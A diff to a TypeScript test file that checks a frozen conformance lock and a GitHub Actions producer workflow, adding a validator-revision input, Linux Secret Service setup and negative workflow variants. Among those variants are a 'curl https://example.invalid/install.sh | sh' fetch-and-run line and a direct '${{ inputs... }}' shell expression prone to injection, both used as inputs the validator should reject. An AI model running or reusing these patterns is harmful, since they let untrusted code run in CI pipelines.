@@ -47,6 +47,9 @@ const TEST_RECORD_PATH =
   '.artifacts/client-v1-conformance-${{ matrix.platform }}.json';
 const TEST_ARTIFACT_NAME =
   'client-v1-conformance-${{ matrix.platform }}';
+const TEST_VALIDATOR_INPUT = '${' + '{ inputs.validator_revision }}';
+const TEST_LINUX_SECRET_SERVICE_COMMAND =
+  'node scripts/phase1-linux-secret-service.mjs --install';
 const TEST_TOOLCHAIN_COMMAND = [
   'node --input-type=module --eval "import { execFileSync }',
   'from \'node:child_process\'; const run = (command, args) =>',
@@ -70,9 +73,15 @@ const TEST_HARNESS_DIGEST_COMMAND = [
   'throw new Error(\'Frozen harness bytes do not match\');"',
 ].join(' ');
 const TEST_HARNESS_COMMAND = [
-  'node scripts/phase1-conformance.mjs',
+  'if [[ "${{ matrix.platform }}" == "linux-x64" ]]; then',
+  'bash scripts/phase1-linux-secret-service.sh',
+  '--validator-revision "$OPENCOVEN_VALIDATOR_REVISION"',
   '--platform "${{ matrix.platform }}"',
-  `--output "${TEST_RECORD_PATH}"`,
+  `--output "${TEST_RECORD_PATH}"; else`,
+  'node scripts/phase1-conformance.mjs',
+  '--validator-revision "$OPENCOVEN_VALIDATOR_REVISION"',
+  '--platform "${{ matrix.platform }}"',
+  `--output "${TEST_RECORD_PATH}"; fi`,
 ].join(' ');
 const TEST_CANONICAL_VALIDATION_COMMAND = [
   'node --input-type=module --eval "import { lstatSync, readFileSync }',
@@ -126,11 +135,17 @@ function protectedProducerSteps(): string[] {
     '        run: corepack pnpm@10.34.0 install --frozen-lockfile --ignore-scripts',
     '      - name: Set up frozen Rust',
     '        run: rustup toolchain install 1.95.0 --profile minimal && rustup default 1.95.0',
+    '      - name: Install frozen Linux Secret Service',
+    "        if: matrix.platform == 'linux-x64'",
+    `        run: ${TEST_LINUX_SECRET_SERVICE_COMMAND}`,
     '      - name: Require frozen toolchain',
     `        run: ${yamlSingleQuoted(TEST_TOOLCHAIN_COMMAND)}`,
     '      - name: Verify frozen harness bytes',
     `        run: ${yamlSingleQuoted(TEST_HARNESS_DIGEST_COMMAND)}`,
     '      - name: Produce platform evidence',
+    '        shell: bash',
+    '        env:',
+    `          OPENCOVEN_VALIDATOR_REVISION: ${TEST_VALIDATOR_INPUT}`,
     `        run: ${TEST_HARNESS_COMMAND}`,
     '      - name: Validate canonical platform record',
     `        run: ${yamlSingleQuoted(TEST_CANONICAL_VALIDATION_COMMAND)}`,
@@ -147,6 +162,10 @@ function createProducerWorkflow({
     'name: client-v1 conformance',
     'on:',
     '  workflow_dispatch:',
+    '    inputs:',
+    '      validator_revision:',
+    '        required: true',
+    '        type: string',
     'permissions:',
     '  contents: read',
     'jobs:',
@@ -224,7 +243,7 @@ const TEST_COMPATIBLE_PRODUCER = {
     aggregationJobName: 'aggregate-conformance',
     aggregationRunnerLabels: ['ubuntu-24.04'],
     environment: 'client-v1-conformance',
-    environmentId: '5000',
+    environmentId: '20863036831',
     artifactNameTemplate: 'client-v1-conformance-{platform}',
     recordPathTemplate:
       '.artifacts/client-v1-conformance-{platform}.json',
@@ -821,8 +840,8 @@ describe('unresolved SDK #38 conformance gaps', () => {
         tree: '7cc5988b5a06f3f279e5c034cf2228775bd2b0e0',
       },
       chat: {
-        commit: 'dbbcf3a71155730f0e707e181ef3ca7e770c719f',
-        tree: '85ce03bfa8ec1a8e5002821eee3147cd73a59e25',
+        commit: 'edd4728792321771496df58bfc0e6122908a96ec',
+        tree: 'c373902b48b06520450f520e669a34f72b64a35d',
         consumerLock: {
           path: 'pnpm-lock.yaml',
           size: 56_222,
@@ -933,7 +952,7 @@ describe('unresolved SDK #38 conformance gaps', () => {
     ).toThrow('Assertion registry bytes do not match the frozen lock');
   });
 
-  test('fails closed because the frozen Chat commit has no schema-v2 producer', () => {
+  test('freezes the compatible Chat schema-v2 producer and protected workflow', () => {
     const lock = readLock() as {
       evidenceProducer: Record<string, unknown>;
     };
@@ -942,30 +961,59 @@ describe('unresolved SDK #38 conformance gaps', () => {
     );
 
     expect(lock.evidenceProducer).toEqual({
-      status: 'blocked',
-      blockerId: 'frozen-chat-commit-has-no-platform-evidence-producer',
+      status: 'compatible',
       repository: 'OpenCoven/chat',
-      commit: 'dbbcf3a71155730f0e707e181ef3ca7e770c719f',
-      tree: '85ce03bfa8ec1a8e5002821eee3147cd73a59e25',
+      commit: 'fa0d6563caa7968848ff83d55a988c72c80fe0b1',
+      tree: 'e987642b540869a6f52dd38763adb4dbd47018fb',
       packageManifest: {
         path: 'package.json',
-        size: 3_202,
+        size: 3_286,
         sha256:
-          'dff8b65c3643b04c9cb85dccfd9035f90046b1f047b84c0a563a6bce6880e17f',
+          'b6ea2245b398f74e47e893068f4bf58b11f7e52e240209d5adcbb3c8c2144565',
       },
-      availableHarness: {
-        path: 'scripts/contract-canary.mjs',
-        size: 36_293,
+      harness: {
+        path: 'scripts/phase1-conformance.mjs',
+        version: '2.0.0',
+        size: 118_110,
         sha256:
-          '1118d1999874b6a5a6fcf48355fe2a30c66b6142e178ff759569982bab4696f4',
+          'e509c3643b8ef56ed7e49ce4e5ee7a7603a2d8276e71194fb6257e092b22648f',
       },
-      availableCommand: 'test:contract-canary',
-      requiredRecordSchemaVersion: 2,
+      command: 'test:phase1-conformance',
+      recordSchemaVersion: 2,
+      workflow: {
+        name: 'client-v1 conformance',
+        path: '.github/workflows/client-v1-conformance.yml',
+        size: 4_914,
+        sha256:
+          'd93d816af659928f8abfd63097e035a432ba6a8c9e4932ebac52312c640886cd',
+        job: 'platform-conformance',
+        jobNameTemplate: 'platform-conformance ({platform})',
+        aggregationJob: 'aggregate-conformance',
+        aggregationJobName: 'aggregate-conformance',
+        aggregationRunnerLabels: ['ubuntu-24.04'],
+        environment: 'client-v1-conformance',
+        environmentId: '20863036831',
+        artifactNameTemplate: 'client-v1-conformance-{platform}',
+        recordPathTemplate:
+          '.artifacts/client-v1-conformance-{platform}.json',
+        sourceRef: 'refs/heads/main',
+        runnerLabels: {
+          'darwin-arm64': ['macos-14'],
+          'linux-x64': ['ubuntu-24.04'],
+          'win32-x64': ['windows-2025'],
+        },
+        signerWorkflow:
+          'OpenCoven/chat/.github/workflows/client-v1-conformance.yml',
+        signerDigest: 'fa0d6563caa7968848ff83d55a988c72c80fe0b1',
+        sourceDigest: 'fa0d6563caa7968848ff83d55a988c72c80fe0b1',
+        predicateType: 'https://slsa.dev/provenance/v1',
+        denySelfHostedRunners: true,
+      },
     });
-    expect(() =>
+    expect(
       assertEvidenceProducerCompatibility(lock as never),
-    ).toThrow(
-      'Frozen Chat commit dbbcf3a71155730f0e707e181ef3ca7e770c719f has no schema-v2 platform evidence producer',
+    ).toEqual(
+      lock.evidenceProducer,
     );
   });
 
@@ -2044,6 +2092,61 @@ describe('unresolved SDK #38 conformance gaps', () => {
         `      - uses: ${ATTEST_BUILD_PROVENANCE_ACTION}\n        if: false\n        with:`,
       );
     const invalidWorkflowVariants = [
+      {
+        name: 'missing validator revision input',
+        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
+          [
+            '    inputs:',
+            '      validator_revision:',
+            '        required: true',
+            '        type: string',
+            '',
+          ].join('\n'),
+          '',
+        ),
+      },
+      {
+        name: 'optional validator revision input',
+        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
+          '        required: true',
+          '        required: false',
+        ),
+      },
+      {
+        name: 'defaulted validator revision input',
+        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
+          '        type: string',
+          '        type: string\n        default: main',
+        ),
+      },
+      {
+        name: 'direct validator expression in shell',
+        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
+          '"$OPENCOVEN_VALIDATOR_REVISION"',
+          '"${{ inputs.validator_revision }}"',
+        ),
+      },
+      {
+        name: 'changed validator environment name',
+        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
+          'OPENCOVEN_VALIDATOR_REVISION:',
+          'UNREVIEWED_VALIDATOR_REVISION:',
+        ),
+      },
+      {
+        name: 'disabled Linux Secret Service setup',
+        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
+          "        if: matrix.platform == 'linux-x64'",
+          '        if: false',
+        ),
+      },
+      {
+        name: 'substituted Linux Secret Service setup',
+        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
+          TEST_LINUX_SECRET_SERVICE_COMMAND,
+          'curl https://example.invalid/install.sh | sh',
+        ),
+      },
       {
         name: 'arbitrary action with disabled official evidence steps',
         workflow: arbitraryActionDisabledOfficialSteps,
